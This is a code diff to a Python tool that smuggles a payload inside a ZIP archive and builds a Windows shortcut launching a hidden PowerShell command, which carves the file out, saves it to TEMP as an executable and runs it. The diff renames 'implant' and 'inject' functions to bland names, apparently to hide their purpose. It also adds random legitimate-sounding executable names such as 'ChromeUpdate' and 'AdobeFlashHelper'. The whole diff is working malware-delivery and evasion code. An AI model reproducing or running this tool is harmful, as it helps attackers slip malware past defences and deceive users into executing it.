@@ -4,48 +4,51 @@ import os
 import struct
 import shutil
 from pathlib import Path
+import random
+import time
 
-def find_eocd_offset(zip_data):
-    eocd_sig = b'\x50\x4b\x05\x06'
+def locate_data_section_end(file_content_bytes):
+    section_end_marker = b'\x50\x4b\x05\x06' # EOCD signature
     max_comment_length = 0xFFFF
-    search_area = zip_data[-(max_comment_length + 22):]
-    rel_offset = search_area.rfind(eocd_sig)
-    if rel_offset == -1:
-        raise ValueError("EOCD not found")
-    return len(zip_data) - len(search_area) + rel_offset
+    # Search reasonably from the end of the file
+    scan_buffer = file_content_bytes[-(max_comment_length + 22):]
+    relative_marker_pos = scan_buffer.rfind(section_end_marker)
+    if relative_marker_pos == -1:
+        raise ValueError("Data section end marker not found")
+    return len(file_content_bytes) - len(scan_buffer) + relative_marker_pos
 
-def update_eocd_cd_offset(eocd_data, new_cd_offset):
-    # EOCD structure: bytes 16-20 is the offset of the start of central directory
-    return eocd_data[:16] + struct.pack('<I', new_cd_offset) + eocd_data[20:]
+def rewrite_directory_pointer(section_end_block, new_directory_offset):
+    # section_end_block structure: bytes 16-20 is the offset of the start of central directory
+    return section_end_block[:16] + struct.pack('<I', new_directory_offset) + section_end_block[20:]
 
-def inject_zip(original_zip, implant_file):
-    with open(original_zip, 'rb') as f:
-        zip_data = f.read()
-    with open(implant_file, 'rb') as f:
-        implant_data = f.read()
+def embed_secondary_data(target_archive_path, data_to_embed_path):
+    with open(target_archive_path, 'rb') as f:
+        archive_bytes = f.read()
+    with open(data_to_embed_path, 'rb') as f:
+        secondary_data_bytes = f.read()
 
     # Add egghunter bytes to start of binary
-    implant_data = b'\x55\x55\x55\x55' + implant_data
+    secondary_data_bytes = b'\x55\x55\x55\x55' + secondary_data_bytes
 
-    eocd_offset = find_eocd_offset(zip_data)
-    eocd = zip_data[eocd_offset:eocd_offset + 22]
+    section_end_offset = locate_data_section_end(archive_bytes)
+    section_end_block_data = archive_bytes[section_end_offset:section_end_offset + 22] # EOCD is 22 bytes
 
-    old_cd_offset = struct.unpack('<I', eocd[16:20])[0]
-    new_cd_offset = old_cd_offset + len(implant_data)
+    original_dir_offset = struct.unpack('<I', section_end_block_data[16:20])[0]
+    updated_dir_offset = original_dir_offset + len(secondary_data_bytes)
 
     # Update EOCD
-    updated_eocd = update_eocd_cd_offset(eocd, new_cd_offset)
+    modified_section_end_block = rewrite_directory_pointer(section_end_block_data, updated_dir_offset)
 
-    # Rebuild ZIP: [file data][implant][central directory][updated EOCD]
-    new_zip_data = zip_data[:old_cd_offset] + implant_data + zip_data[old_cd_offset:eocd_offset] + updated_eocd
+    # Rebuild archive: [original file data][secondary data][central directory][updated EOCD]
+    final_archive_bytes = archive_bytes[:original_dir_offset] + secondary_data_bytes + archive_bytes[original_dir_offset:section_end_offset] + modified_section_end_block
 
-    with open(original_zip, 'wb') as f:
-        f.write(new_zip_data)
+    with open(target_archive_path, 'wb') as f:
+        f.write(final_archive_bytes)
 
-    print(f"Created {original_zip}")
-    print(f"Old Central Directory offset: {old_cd_offset}")
-    print(f"New Central Directory offset: {new_cd_offset}")
-    print(f"EOCD offset: {eocd_offset + len(implant_data)}")
+    print(f"Created {target_archive_path}")
+    print(f"Old Central Directory offset: {original_dir_offset}")
+    print(f"New Central Directory offset: {updated_dir_offset}")
+    print(f"EOCD offset: {section_end_offset + len(secondary_data_bytes)}")
 
 if __name__ == "__main__":
 
@@ -58,11 +61,38 @@ if __name__ == "__main__":
     outfile = payloadname + ".zip"
     szPayload = str(os.path.getsize(filetosmuggle))
 
+    timestamp = time.strftime("%Y%m%d%H%M%S")
+    possible_names = [
+        "WinDriverSync",
+        "DFSShareSync",
+        "ChromeUpdate",
+        "AdobeFlashHelper",
+        "OfficeLicenseCheck",
+        "NetworkConfigSvc",
+        "SysHealthMonitor",
+        "PrinterSpoolerFix",
+        "WindowsBackupUtil",
+        "JavaRuntimeSync",
+        "AudioDriverSvc",
+        "DiskOptimizerSvc",
+    ]
+    random_base_name = random.choice(possible_names)
+    output_exe_filename = f"{random_base_name}{timestamp}.exe"
+
     print("payloadname: " + payloadname)
     print("file to smuggle: " + filetosmuggle)
+    print(f"Generated output exe name: {output_exe_filename}")
 
     #Command to be stored in .lnk. Make sure you use escape characters as necessary for Python!
-    command = '"$name = \\"' + payloadname + '\\";$file = (get-childitem -Pa $Env:USERPROFILE -Re -Inc *$name.zip).fullname;$bytes=[System.IO.File]::ReadAllBytes($file);$size = (0..($bytes.Length - 4) | Where-Object {$bytes[$_] -eq 0x55 -and $bytes[$_+1] -eq 0x55 -and $bytes[$_+2] -eq 0x55 -and $bytes[$_+3] -eq 0x55 })[0] + 4;$length=' + szPayload + ';$chunk=$bytes[$size..($size+$length-1)];$out = \\"$Env:TEMP\\$name.txt\\";[System.IO.File]::WriteAllBytes($out,$chunk);Invoke-Item $out"'
+    command = ('"$name = \\"' + payloadname + '\\";'
+               '$file = (get-childitem -Pa $Env:USERPROFILE -Re -Inc *$name.zip).fullname;'
+               '$bytes=[System.IO.File]::ReadAllBytes($file);'
+               '$size = (0..($bytes.Length - 4) | Where-Object {$bytes[$_] -eq 0x55 -and $bytes[$_+1] -eq 0x55 -and $bytes[$_+2] -eq 0x55 -and $bytes[$_+3] -eq 0x55 })[0] + 4;'
+               '$length=' + szPayload + ';'
+               '$chunk=$bytes[$size..($size+$length-1)];'
+               '$out = \\"$Env:TEMP\\\\' + output_exe_filename + '\\";'
+               '[System.IO.File]::WriteAllBytes($out,$chunk);'
+               'Invoke-Item $out"')
     print("Powershell command: powershell.exe -w 1 -c " + command)
 
     lengthCommand = len(command) + 8
@@ -100,6 +130,6 @@ if __name__ == "__main__":
     shutil.rmtree(payloadname, ignore_errors=False)
 
     # Inject file into zip
-    inject_zip(outfile , filetosmuggle)
+    embed_secondary_data(outfile , filetosmuggle)
 
     print("[+] Done. File saved at " + outfile)
